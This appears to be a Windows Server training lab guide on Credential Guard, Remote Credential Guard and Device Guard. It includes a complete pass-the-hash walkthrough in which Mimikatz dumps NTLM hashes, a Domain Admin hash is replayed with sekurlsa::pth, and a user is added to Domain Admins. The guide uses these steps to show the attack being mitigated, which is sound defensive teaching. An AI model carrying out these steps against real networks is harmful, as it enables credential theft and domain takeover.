  
<!---<br>
Version: 1.0 <br>
-->  

* * *
  
# Familiarize yourself with the lab environment  
  
## Scenario  
The Integrated Digital Lab (IDL) environment you are using to perform this lab has a number of features to help ensure that you complete the steps accurately and get the most out of the lab experience. In this brief exercise, you will familiarize yourself with some of the interactive features used in the IDL lab environment that are designed to promote and realize the learning goals of the lab. If you are already familiar with the IDL lab environment, please ensure that you perform the first step in this exercise to sign in to DC01 and then click Done to progress through the remaining steps in the exercise to advance to the next exercise of the lab: Implement Storage Spaces Direct.  
  
## COMPLETION MESSAGE  
  
  
### Ensure you are signed in to SRV01  
Click the **Switch to Machine** icon to the right of this instruction to ensure that you are on the **SRV01** virtual machine. If necessary, sign in as **CONTOSO\LabAdmin** using **Passw0rd!** as the password.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV01  
  
  
### Explore knowledge and automation features  
This IDL features both knowledge and automation. Whenever you see the **Action** [Bolt] icon next to text, all or part of the step has been automated, and you can click the **Action** icon to perform the step. Whenever you see the **Knowledge** [Bulb in Head] icon, the **Alert** [Triangle] icon, the **Screenshot** [Camera] icon, or the **Video** [Movie Camera] icon, additional information has been provided to enhance your lab experience. Click the **Action** [Bolt] icon, **Knowledge** [Bulb in Head] icon, and **Screenshot** [Camera] icon now.  
  
#### :warning: ALERT  
This is an alert. Alerts are mandatory elements that will pop up to draw your attention to critical information or to provide warnings.  
  
#### :bulb: KNOWLEDGE  
This is an information item. Unlike alerts, information items are optional. They are used to provide additional information and context for specific lab tasks.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 91a7d80d.jpg  
>\* ShowAutomatically = No  
  
  
  
#### :calling: COMMAND  
```ShellWithUi  
PowerShell -Command "Write-Host 'Nice work, you ran this command.'"  
```  
  
  
### Use the Type Text icon  
Open a Command Prompt window, if one is not already open. Click in the Command Prompt window. Click the **Type Text** icon to the right of this instruction, and then press **ENTER**. The network information for SRV01 is displayed.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 7a9c46b9.PNG  
>\* ShowAutomatically = No  
  
  
  
#### :calling: COMMAND  
```TypeText  
ipconfig /all  
```  
  
  
### Close all open windows  
Close all open windows.  
  
  
  
  
  
# Configure Credential Guard  
  
## Scenario  
In this exercise, you will observer how Credential Guard can protect the credential derivatives—for example, an NTLM hash and a Kerberos ticket—in memory, and prevent a Pass-the-Hash attack. You will perform the following task on SRV02:  

- Retrieve hashed credentials from the Local Security Authority.
- Use the hashed credentials to gain access to the domain and grant permissions.
- Enable Credential Guard using Group Policy.
- Verify that credential hashes are protected by using Credential Guard.

  
**Virtual Machines:**  

- SRV01
- SRV02

  
  
## COMPLETION MESSAGE  
Congratulations! You have successfully protected in-memory LSA hashes by using Credential Guard.  
  
### Sign in to SRV02 as Adam Barr  
Sign in to SRV02 as **Contoso\AdamBarr** using **Passw0rd!** as the password.  
  
#### :bulb: KNOWLEDGE  
Adam Barr has local administrative permissions on SRV02. However, he only belongs to the Domain Users group. In subsequent steps, Adam will use a Pass-the-Hash attack to make himself a member of the Domain Admins group.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV02  
  
  
### Switch to SRV01  
Switch to **SRV01** by clicking the **Switch to Machine** icon to the right of this instruction.  
  
#### :bulb: KNOWLEDGE  
There are many ways to leave account information on a server—local logon, remote logon, remote share connection, etc. In this exercise, you will use remote logon, described in the following tasks, to leave administrative account information on SRV02.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV01  
  
  
### Ensure you are signed in as LabAdmin  
On SRV01, ensure you are signed in as **CONTOSO\LabAdmin** using **Passw0rd!** as the password.  
  
  
  
  
### Establish an RDP connection with SRV02  
On the desktop of SRV01, double-click **SRV02.rdp**. In a few moments, an RDP session is established to SRV02. Click **OK** to complete the sign-in to SRV02.  
  
#### :warning: ALERT  
Please ensure you click OK to complete the sign in process.  
  
#### :bulb: KNOWLEDGE  
Contoso\LabAdmin is a member of the Domain Admins groups. You are establishing a remote connection to SRV02 so that the credential hash for this account will be in memory on SRV02, and thus subject to theft.  
  
  
  
  
### Switch to SRV02  
Click the **Switch to Machine** icon to the right of this instruction to switch to **SRV02**.  
  
#### :bulb: KNOWLEDGE  
In the next few tasks, you will see how attackers can review NTLM hashes stored in SRV02, and perform a Pass-the-Hash attack to elevate a domain user to become a domain admin.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV02  
  
  
### Open Windows PowerShell  
On SRV02, on the taskbar, right-click **Windows PowerShell**, and then click **Run as Administrator**. Click **Yes** when prompted by User Account Control (UAC).  
  
  
  
  
### Attempt a remote session with the DC  
At the Windows PowerShell command prompt, type **Enter-PsSession DC**, and then press **ENTER**. The command fails because Contoso\AdamBarr does not have administrative permissions on the domain controller.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 665259.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
Enter-PsSession DC  
```  
  
  
### Close Windows PowerShell  
Close Windows PowerShell  
  
  
  
  
### Use Mimikatz to verify credential information  
Proceed to the next step to start the Mimikatz tool to verify credential information. Please click the **Knowledge** [Bulb in Head] icon to learn more about Mimikatz and its use in this lab.  
  
#### :bulb: KNOWLEDGE  
Mimikatz is a free tool that is used to reveal credential information stored in Windows memory. It is used widely in credential theft attacks.  
   
 The use of Mimikatz in this lab is intended to emphasize the importance of having a defense-in-depth strategy to mitigate risk. In the real world, an attacker first needs the ability to execute the Mimikatz tool on a machine either locally or through a remote session. For example, the attacker has to get the tool on the server in the first place by exploiting a vulnerability such as a weak password or an email attachment, or even by physically tampering with an administrative station as the user steps away from their computer. Physical security of hosts is important in order to control access to the server boot process and the running operating system.  
   
 Both physical and technological controls have to be in place to mitigate the risk of Mimikatz and similar tools and malware from being installed in the first place. As well, additional controls need to be in place to ensure that people who have administrative access are trustworthy. Security is not just about processes and technology—it is also about people.  
  
  
  
  
### Open the Mimikatz folder  
Double-click the **LabFiles** folder shortcut on the desktop, and then navigate to **mimikatz\x64**. Alternatively, click the **Action** icon to the right of this instruction.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 665261.PNG  
  
  
  
#### :calling: COMMAND  
```Shell  
explorer.exe "c:\labfiles\mimikatz\x64"  
```  
  
  
### Start Mimikatz  
Right-click **mimikatz.exe**, and then click **Run as Administrator**. Click **Yes** when prompted by UAC.  
  
#### :warning: ALERT  
By default, Mimikatz and other similar tools are considered malware and would automatically be removed by Windows Defender. In this lab, the folder containing the Mimikatz tool is excluded from malware scanning; otherwise it would have been removed from the system. You may see summary messages from Windows Defender about the presence of this tool. You can ignore these messages.  
  
  
  
  
### Enter debug mode  
Type **privilege::debug**. The text Privilege ‘20’ OK should be displayed.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 666199.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
privilege::debug  
```  
  
  
### Retrieve NTLM hashes  
In Mimikatz, type **sekurlsa::logonpasswords**, and then press **ENTER**.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 665263.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
sekurlsa::logonpasswords  
```  
  
  
### Locate the LabAdmin account password hash  
Scroll through the Mimikatz output and locate the username **LabAdmin**. Notice the NTLM hash for the LabAdmin password.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 652751.PNG  
>\* ShowAutomatically = Always  
  
  
  
  
### Run Powershell using NTLM hash for other account  
Select the NTLM hash value only, and then press **ENTER** to copy it to the clipboard.  
  
#### :warning: ALERT  
Do not select the preceding \* NTLM : label, select only the hash value.  
  
#### :bulb: KNOWLEDGE  
Copy the LabAdmin NTLM hash.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 652752.PNG  
  
  
  
  
### Paste the hash  
In the Mimikatz window, type **sekurlsa::pth /user:labadmin /domain:contoso /ntlm:Paste\_the\_hash\_here /run:powershell.exe**. Use the arrow keys to move the cursor to where you want to paste the hash. Delete the placeholder text, and then press **CTRL+V** to paste the hash value. Press **ENTER** to run the command.  
  
#### :warning: ALERT  
Use the arrow keys to move the cursor to where you want to paste the hash. Delete the placeholder text, and then press CTRL+V to paste the hash value.  
  
#### :bulb: KNOWLEDGE  
The pth switch stands for pass the hash. This means that the logged-on user can start a process or application as another user by supplying that account hash instead of the account password. There is no need to determine the password in this case, and Windows PowerShell will be started with privilege of the LabAdmin account, which is a member of the Domain Admins group.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 652753.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
sekurlsa::pth /user:LabAdmin /domain:contoso /ntlm:Paste\_the\_hash\_here /run:powershell.exe  
```  
  
  
### Access the domain controller as LabAdmin  
In the newly opened Windows PowerShell window, type **Enter-PsSession DC**, and then press **ENTER**.  
 Remote access to a domain controller has now been given to someone who does not know the administrator password, but knows only the NTLM hash.  
  
  
  
#### :calling: COMMAND  
```TypeText  
Enter-PsSession DC  
```  
  
  
### Verify the impersonated identity  
At the Windows PowerShell command prompt, type **whoami**, and then press **ENTER**.  
  
#### :bulb: KNOWLEDGE  
You are signed in to the DC as Contoso\LabAdmin by using a remote Windows PowerShell session. You did not need to enter a password to establish this connection.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 656174.PNG  
  
  
  
  
### Add a user to the Domain Admins group  
At the Windows PowerShell command prompt, type the following command, and then press **ENTER**.  
**Add-ADGroupMember -Identity "Domain Admins" -Members "AdamBarr"**  
  
#### :bulb: KNOWLEDGE  
As an attacker, you had access to the AdamBarr domain user  account before the attack, and now you have access to a domain admin account as AdamBarr.  
  
  
  
#### :calling: COMMAND  
```TypeText  
Add-ADGroupMember -Identity "Domain Admins" -Members "AdamBarr"  
```  
  
  
### Verify group membership  
At the Windows PowerShell command prompt, type **Get-ADGroupMember -Identity "Domain Admins"**, and then press **ENTER**. The Adam Barr account is listed as a member of the Domain Admins group.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 665265.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
Get-ADGroupMember -Identity "Domain Admins"  
```  
  
  
### Sign out and sign back in to SRV02  
Sign out of SRV02 and then sign back in as **Contoso\AdamBarr** using **Passw0rd!** as the password.  
  
#### :bulb: KNOWLEDGE  
Adam must sign out and sign back in again in order for his security token to be updated with his membership in the Domain Admins group.  
  
  
  
  
### Open Windows PowerShell to verify elevated access  
On SRV02, on the taskbar, right-click **Windows PowerShell**, click **Run as Administrator**, and then click **Yes**.  
  
  
  
  
### Establish a remote session with DC  
At the Windows PowerShell command prompt, type **Enter-PsSession DC**, and then press **ENTER**. The command succeeds because the Adam Barr account is now a member of the Domain Admins group.  
  
#### :bulb: KNOWLEDGE  
By establishing a PowerShell remoting session, you have verified that Adam Barr now has complete access to a domain controller, and thus can take control over the domain, as well as get access to all the information in this domain. In the next part of the exercise, you will see how Credential Guard can protect the credentials from this type of attack.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 665268.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
Enter-PsSession DC  
```  
  
  
### Exit remote session  
At the Windows PowerShell command prompt, type**Exit-PsSession**, and then press **ENTER**.  
  
  
  
#### :calling: COMMAND  
```TypeText  
Exit-PsSession  
```  
  
  
### Start the local Group Policy editor  
Right-click **Start**, and then click **Run**. In the Run dialog box, type, type **gpedit.msc**, and then press **ENTER**. Alternatively, click the **Action** icon to the right of this instruction to open **gpedit.msc**.  
  
#### :bulb: KNOWLEDGE  
Device Guard settings can and should  be configured by using a Group Policy Object in Active Directory. You are using a local policy to simplify the lab instructions.  
  
  
  
#### :calling: COMMAND  
```Shell  
gpedit.msc  
```  
  
  
### Navigate to Device Guard settings  
In Computer Configuration, expand**Administrative Templates**, expand **System**, and then click **Device Guard**.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 652757.PNG  
  
  
  
  
### Configure virtualization-based security  
In the details pane, double-click **Turn On Virtualization Based Security**. Select the **Enabled** radio button.  
  
  
  
  
### Configure the Credential Guard settings  
Under Credential Guard Configuration, in the Select Platform Security Level list, select **Secure Boot**, and  then in the Credential Guard Configuration list, select **Enable with UEFI lock**. Click **OK**.  
  
#### :bulb: KNOWLEDGE  
The Enable with UEFI lock option prevents Credential Guard from being disabled remotely; configuration data is stored in the local UEFI.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 652759.png  
>\* ShowAutomatically = Always  
  
  
  
  
### Restart SRV02  
Right-click **Start**, click **Shutdown or sign out**, and then click **Restart**. Note that if LabAdmin is still signed in to a remote session, you may be prompted to restart anyway.  
  
#### :bulb: KNOWLEDGE  
For the policy update, you can run gpupdate /force cmd. The reason you need to restart the computer is to clear the account information in memory , which will make it easier to see the difference when the credential derivatives are protected by Credential Guard.  
  
  
  
#### :calling: COMMAND  
```PowerShell  
Restart-Computer -force   
```  
  
  
### Sign in to SRV02  
After the server restarts, sign in to **SRV02** as **CONTOSO\AdamBarr** using**Passw0rd!** as the password**.**  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV01  
  
  
### Open Windows PowerShell  
On the taskbar, right-click **Windows PowerShell**, and then click **Run as Administrator**. Click **Yes** when prompted by UAC.  
  
  
  
  
### Start the System Information tool  
At the Windows PowerShell command prompt, type**msinfo32**, and then press **ENTER**. The System Information screen opens.  
  
  
  
#### :calling: COMMAND  
```TypeText  
msinfo32  
```  
  
  
### Verify the Credential Guard status  
Under System Summary, verify the following values:  
 Device Guard Security Services Configured: **Credential Guard**  
 Device Guard Security Services Running: **Credential Guard**  
  
#### :bulb: KNOWLEDGE  
The underlying physical or virtual machine must have the firmware Secure Boot option enabled for Credential Guard to be running.  
  
You can also type Get-ComputerInfo DeviceGuard\* in Windows PowerShell to verify that Credential Guard is configured.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 652786.PNG  
>\* ShowAutomatically = Always  
  
  
  
  
### Close the System Information tool  
Click the **X** in the upper-right corner to close the tool.  
  
  
  
  
### Verify Credential Guard status using PowerShell  
At the Windows PowerShell command prompt, type **Get-ComputerInfo DeviceGuard\***, and then press**ENTER**. Notice that Credential Guard is configured and running.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 655174.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
Get-ComputerInfo DeviceGuard\*  
```  
  
  
### Verify credential information protection  
You will run Mimikatz again on the computer that has Credential Guard enabled to see how the credentials are protected in memory, thus making it impossible for the attacker to simply copy the hash and use it to gain access.  
  
  
  
  
### Open the Mimikatz folder  
Open File Explorer, and then navigate to **C:\LabFiles\mimikatz\x64**.  
  
  
  
#### :calling: COMMAND  
```Shell  
explorer.exe C:\LabFiles\mimikatz\x64  
```  
  
  
### Start Mimikatz again  
In **C:\LabFiles\mimikatz\x64**, right-click **mimikatz**, and then click **Run as Administrator**. Click **Yes** when prompted by UAC.  
  
  
  
  
### Enter debug mode in Mimikatz  
Type **privilege::debug**. The text **Privilege ‘20’ OK** should be displayed.  
  
  
  
#### :calling: COMMAND  
```TypeText  
privilege::debug  
```  
  
  
### Attempt to retrieve LSA hashes from memory  
Type **sekurlsa::logonpasswords**. A list of account credentials is displayed.  
  
  
  
#### :calling: COMMAND  
```TypeText  
sekurlsa::logonpasswords  
```  
  
  
### View encrypted LSA hashes  
Scroll up to the entry for the username **AdamBarr**. Notice that the encrypted value is now displayed instead of the NTLM hash.  
  
#### :bulb: KNOWLEDGE  
Credential Guard is an important defense-in-depth mitigation strategy to prevent against Pass-the-Hash attacks and other threat vectors.  
   
 Also note that, if you were to establish a remote session from SRV01, the NTLM hashes of those remote credentials would also be encrypted. To test this, switch to SRV01, double-click SRV02.rdp on the desktop, and then click OK to sign in. Switch to SRV02 and retrieve the NTLM hashes by using Mimikatz.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 652769.PNG  
>\* ShowAutomatically = Always  
  
  
  
  
### Close all open windows  
Type **exit** to close the Mimikatz tool. Close the Windows Explorer window if it is still open.  
  
  
  
  
### Sign out of SRV02  
On SRV02, right-click **Start**. Click **Shut down or sign out**, and then click **Sign out**.  
  
  
  
  
  
# Configure Remote Credential Guard  
  
## Scenario  
In this exercise, you will observe how Remote Credential Guard can better protect the credentials in RDP connections. You will use SRV02 as the RDP client, and SRV01 as the RDP server to perform the following tasks:  

- Establish an RDP connection without Remote Credential Guard, and see the credential derivatives—an NTLM hash and Kerberos ticket—that are available for attackers on the RDP server.
- Configure the RDP server to allow RDP client connections by using Remote Credential Guard.
- Establish an RDP connection by using Remote Credential Guard and verify that no credential derivatives are stored on the RDP server.
- Connect to file shares from within the RDP session by using Remote Credential Guard to observe the single sign-on experience.  
  
**Virtual Machines:**
- SRV01
- SRV02

  
  
## COMPLETION MESSAGE  
Congratulations! You have successfully enabled and tested the Remote Guard feature.  
  
### Switch to SRV02  
Click the **Switch to Machine** icon to the right of this instruction to switch to **SRV02**.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV02  
  
  
### Sign in to SRV02  
On SRV02, on the sign-in screen, click **Other user**. Sign in to **SRV02** as **CONTOSO\BenSmith**, using **Passw0rd!** as the password.  
  
  
  
  
### Open Windows PowerShell  
On the taskbar, click **Windows PowerShell**.  
  
  
  
  
### RDP to SRV01 without Remote Credential Guard  
At the Windows PowerShell command prompt, type**mstsc /v:srv01**, and then press **ENTER**. When prompted, type **Passw0rd!** as the password, and then click **OK**.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 655133.png  
>\* ShowAutomatically = Always  
  
  
  
  
### Use Mimikatz to verify credential information  
Proceed to the next step in which you will start the Mimikatz tool to verify credential information on the RDP server when the RDP connection is not protected by Remote Credential Guard. Click the **Knowledge** [Bulb in Head] icon to learn more about Mimikatz and its use in this lab.  
  
#### :bulb: KNOWLEDGE  
Mimikatz is a free tool that is used to reveal credential information stored in Windows memory. It is used widely in credential theft attacks.  
   
 The use of Mimikatz in this lab is intended to emphasize the importance of having a defense-in-depth strategy to mitigate risk. In the real world, an attacker first needs the ability to execute the Mimikatz tool on a machine either locally or through a remote session. For example, the attacker has to get the tool on the server in the first place by exploiting a vulnerability such as a weak password or an email attachment, or even by physically tampering with an administrative station as the user steps away from their computer. Physical security of hosts is important in order to control access to the server boot process and the running operating system.  
   
 Both physical and technological controls have to be in place to mitigate the risk of this and similar tools and malware from being installed in the first place. As well, additional controls need to be in place to ensure that people who have administrative access are trustworthy. Security is not just about processes and technology—it is also about people.  
  
  
  
  
### Start the Mimikatz tool  
Double-click the **LabFiles** shortcut on the desktop. Navigate to **mimikatz\x64**, right-click **mimikatz**, and then click **Run as administrator**. When prompted, sign in as **CONTOSO\Administrator** using **Passw0rd!** as the password.  
  
  
  
  
### Enter debug mode  
Type **privilege::debug**. The text **Privilege ‘20’ OK** should be displayed.  
  
  
  
  
### Retrieve NTLM hashes  
In Mimikatz,  type **sekurlsa::logonpasswords**, and then press **ENTER**.  
  
  
  
  
### View Ben's NTLM hash  
Scroll up and view Ben's NTLM hash. Click the **Knowledge** icon to view an explanation of the reason why allowing the hash to become known to a threat agent is a significant security problem.  
  
#### :bulb: KNOWLEDGE  
The Mimikatz tool and other similar tools are able to retrieve NTLM hashes. As you will see in the next exercise, an attacker who is in possession of an NTLM hash can launch a Pass-the-Hash attack to sign in to a system. It is not necessary for the attacker to know the password. If the attacker can successfully present the hash to the authentication server, the attacker can assume the identity associated with the hash.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 655139.PNG  
>\* ShowAutomatically = Always  
  
  
  
  
### Sign out of the RDP session  
In the SRV01 RPD session, right-click **Start**, click **Shut down or sign out**, and then click **Sign out**. Alternatively, open Windows PowerShell, type **logoff**, and then press **ENTER**.  
  
  
  
  
### Switch to SRV01  
Click the **Switch to Machine** icon to switch to SRV01. If necessary, sign in to SRV01 as **CONTOSO\LabAdmin** using **Passw0rd!** as the password.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV01  
  
  
### Open Windows PowerShell  
On the taskbar, right-click **Windows PowerShell**, click **Run as Administrator**, and then click **Yes**.  
  
  
  
  
### Configure SRV01 for Remote Credential Guard  
At the Windows PowerShell command prompt, type **\\DC\C$\LabFiles\Ben\RemoteGuardConfig.ps1**, and then press **ENTER**. The RemoteGuardConfig.ps1 script will set the registry on the RDP server which allows the RDP client to use Remote Guard for the RDP connection.  
  
#### :bulb: KNOWLEDGE  
To save time and ensure accuracy, you are using a script to enable Remote Credential Guard. The script will enable the RDP server to accept an RDP connection that uses Remote Credential Guard.  
   
 The script adds a new DWORD value named DisableRestrictedAdmin to HKLM\System\CurrentControlSet\Control\Lsa and sets this value to 0. The **Screenshot** shows the DWORD that is added.  
  
For more information on how to enable Remote Credential Guard and restricted admin mode, please see [https://technet.microsoft.com/en-us/itpro/windows/keep-secure/remote-credential-guard](https://technet.microsoft.com/en-us/itpro/windows/keep-secure/remote-credential-guard).  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 652806.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
\\DC\C$\LabFiles\Ben\RemoteGuardConfig.ps1  
```  
  
  
### Leave Windows PowerShell open  
Leave Windows PowerShell open for subsequent tasks.  
  
  
  
  
### Switch to SRV02 to configure RDP Connection Policy  
Click the **Switch to Machine** icon to switch to **SRV02**. If necessary, sign in as **CONTOSO\BenSmith**, using **Passw0rd!** as the password.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV02  
  
  
### Open Windows PowerShell as administrator  
On the taskbar, right-click **Windows PowerShell**, and then click **Run as Administrator**. In the User Account Control dialog box, type **CONTOSO\Administrator** as the username and**Passw0rd!** as the password, and then click **Yes**. After completing this step, you will have two Windows PowerShell sessions open. Leave the other Windows PowerShell session open. You will use it in subsequent steps.  
  
#### :warning: ALERT  
Please ensure you launch a new Windows PowerShell session as an administrator; otherwise, subsequent steps will fail.  
  
#### :bulb: KNOWLEDGE  
You need to launch Windows PowerShell as an administrator in order to perform the next steps in this lab exercise.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 655179.PNG  
  
  
  
  
### Open the Local Group Policy Editor  
At the Administrative Windows PowerShell command prompt, type **gpedit.msc**, and then press **ENTER**. The Local Group Policy Editor will fail to open properly unless you launch it from an administrative Windows PowerShell command prompt.  
  
  
  
#### :calling: COMMAND  
```TypeText  
gpedit.msc  
```  
  
  
### Navigate to the Credentials Delegation setting  
In the Local Group Policy Editor, expand **Computer Configuration**, expand **Administrative Templates**, expand**System**, and then click **Credentials Delegation**.  
  
#### :bulb: KNOWLEDGE  
In a production environment, you would use a Group Policy Object defined at the domain, site, or organizational unit level to enforce this policy setting. You are using a local policy to simplify lab steps.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 660646.PNG  
  
  
  
  
### Configure the setting to restrict delegation  
Double-click**Restrict delegation of credentials to remote servers**. Select **Enabled**. Under Use the following restricted mode, select **Require Remote Credential Guard**, and then click **OK**.  
  
#### :bulb: KNOWLEDGE  
In this step, you are specifying that Remote Credential Guard is the only method to use for the connection.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 660647.PNG  
  
  
  
  
### Close the Local Group Policy Editor  
Close the Local Group Policy Editor.  
  
  
  
  
### Update Group Policy  
At the Administrative Windows PowerShell command prompt, type **gpupdate /force**, and then press **ENTER**.  
  
  
  
#### :calling: COMMAND  
```TypeText  
gpupdate /force  
```  
  
  
### Close the Administrative PowerShell prompt  
Close the Administrative Windows PowerShell Command Prompt window.  
  
  
  
  
### RDP to SRV01 with Remote Cred Guard  
At the Windows PowerShell command prompt, type **mstsc /v:srv01**. This opens a Remote Desktop session to SRV01 by using the Remote Guard feature, without requiring you to enter your credentials for the remote session.  
  
#### :warning: ALERT  
**IMPORTANT:** Please ensure that you are **NOT** using an administrative Windows PowerShell command prompt. If you use a non-administrative Windows PowerShell command prompt, you are not required to enter credentials for the RDP session. This is a consequence of enabling Remote Guard and is intended. Please click the **Knowledge** icon to see additional information.  
  
#### :bulb: KNOWLEDGE  
Remote Credential Guard protects credentials over an RDP connection by redirecting the Kerberos requests back to the device—in this case SRV02—that is requesting access. If the target device is compromised—for example, by the presence of malware that can read NTLM hashes in memory—the requestor’s credentials are not compromised because the credentials are never sent to the target device.  
   
 Also note that, if you had not configured the policy to require Remote Credential Guard from the client device, you could have used the mstsc /remoteguard switch to ensure that you connected to the target server by using Remote Credential Guard.  
  
  
  
  
### Open Windows PowerShell as an administrator  
On the taskbar, right-click **Windows PowerShell**, and then click **Run as Administrator**. In the User Account Control dialog box, type **CONTOSO\Administrator** as the username and **Passw0rd!** as the password, and then click **Yes**.  
  
  
  
  
### View RDP logon events  
At the Windows PowerShell command prompt, type the following command, and then press **ENTER**.  
**Get-WinEvent -Logname Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational | where {$\_.ID -eq '1149'} | FL**  
  
#### :bulb: KNOWLEDGE  
You see the Remote Desktop logon events for the Ben Smith user object. The latest entries show a blank user and domain name. This is expected. Recall that when Remote Credential Guard is enabled, the Kerberos requests are redirected back to the device requesting the connection. The user credentials or credential derivatives are not sent to the target device.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 660669.PNG  
  
  
  
#### :calling: COMMAND  
```TypeText  
Get-WinEvent -Logname Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational | where {$\_.ID -eq '1149'} | FL  
```  
  
  
### Close Windows PowerShell  
Close the Administrative Windows PowerShell Command Prompt window.  
  
  
  
  
### Start the Mimikatz tool  
Double-click the **LabFiles** shortcut on the desktop. Navigate to **mimikatz\x64**, right-click **mimikatz**, and then click **Run as administrator**. When prompted, sign in as **CONTOSO\Administrator** using **Passw0rd!** as the password.  
  
  
  
  
### Retrieve NTLM hashes  
In Mimikatz, type **privilege::debug**, press **ENTER**, type **sekurlsa::logonpasswords**, and then press **ENTER**.  
  
  
  
  
### View Ben's encrypted credentials  
Scroll up and review Ben's session information. The NTLM hash is no longer visible; instead the credentials are encrypted. This is because the Remote Guard feature is being used for the RDP session.  
  
#### :bulb: KNOWLEDGE  
The other password hashes on SRV01 are still plainly visible. In the next exercise, you will enable Credential Guard to remove this type of vulnerability from the system.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 655145.PNG  
>\* ShowAutomatically = Always  
  
  
  
  
### Sign out of the remote session  
In the remote session, right-click **Start**, click**Shut down or sign out**, and then click **Sign out**.  
  
  
  
  
  
# Configure Device Guard  
  
## Scenario  
In this exercise, you will create and deploy a code integrity policy, and then observe how it will report on files not covered by the code integrity policy when the policy is set to audit mode, and how it will prevent those files from running when the policy is set to enforce mode.  
  
You will perform the following tasks:  

- Create a new code integrity policy configured for audit mode.
- Verify that applications not allowed by the code integrity policy—for example, Notepad++ and Mimikatz—are being reported in the event log.
- Change the audit code integrity policy to enforcement mode.
- Review the event log after attempting to run the same applications again.

  
  
## COMPLETION MESSAGE  
Congratulations! You have successfully configured Device Guard to control and restrict application execution.  
  
### Switch to SRV01  
Switch to SRV01. If necessary, sign in to **SRV01** as**CONTOSO\LabAdmin** using **Passw0rd!** as the password.  
  
  
  
  
#### :computer: ACTIONS  
>LODSProperties  
>\* VM = SRV01  
  
  
### Open Windows PowerShell  
On the taskbar, right-click **Windows PowerShell**, click **Run as Administrator**, and then click **Yes**.  
  
  
  
  
### Create a code integrity policy  
At the Windows PowerShell command prompt, type **New-CIPolicy –Filepath C:\ci\audit.xml –Level Publisher –UserPEs –Fallback hash**, and then press **ENTER**. After a few moments, press **Ctrl+C** to cancel the job. You may need to press **Ctrl+C** a few times.  
  
#### :warning: ALERT  
This cmdlet will run for 30 minutes as it scans for software. To save time in the lab, the code integrity policy file that is located at **C:\CI\\SRV01-Audit.xml** has been created for you as part of the lab setup.  
  
  
  
#### :bulb: KNOWLEDGE  
The **-Level Publisher** parameter uses the Publisher metadata from the software to generate rules for installed applications.  
  
The **-UserPEs** parameter scans for not only kernel mode files, but also user mode files.  
  
The **-Fallback hash** parameter uses a hash value for generating rules if publisher information is unavailable.  
  
  
  
#### :calling: COMMAND  
```TypeText  
New-CIPolicy -Filepath "c:\ci\audit.xml" -Level Publisher -UserPEs -Fallback hash  
```  
  
  
### Verify the code integrity policy Audit mode  
On **SRV01**, double-click **C:\CI\SRV01-Audit.xml**. The file opens in Internet Explorer. Notice the entry **Enabled: Audit Mode**. Close Internet Explorer and Windows Explorer.  
  
#### :bulb: KNOWLEDGE  
Audit mode does not block applications from running. Instead, entries are logged to the event viewer logs.  
  
#### :camera: SCREENSHOT  
>LODSProperties  
>\* Uri = 653390.png  
>\* ShowAutomatically = Always  
  
  
  
#### :calling: COMMAND  
```Shell  
explorer c:\ci  
```  
  
  
### Convert the XML policy to binary format  
At the Windows PowerShell command prompt, type **ConvertFrom-CIPolicy -XmlFilePath “C:\CI\Srv01-audit.xml” -BinaryFilePath “C:\CI\Srv01-audit.bin"**, and then press **ENTER**. The command takes a few minutes to run.  
  
  
  
#### :calling: COMMAND  
```TypeText  
ConvertFrom-CIPolicy -XmlFilePath "C:\CI\Srv01-audit.xml" -BinaryFilePath "C:\CI\Srv01-audit.bin"  
```  
  
  
### Copy the binary policy file  
At the Windows PowerShell command prompt, type **Copy-item “C:\CI\Srv01-audit.bin” “C:\Windows\System32\CodeIntegrity\Sipolicy.p7b”**, and then press **ENTER**.  
  
#### :warning: ALERT  
Make sure the filename and location matches the instructions.  
  
  
  
#### :calling: COMMAND  
```TypeText  
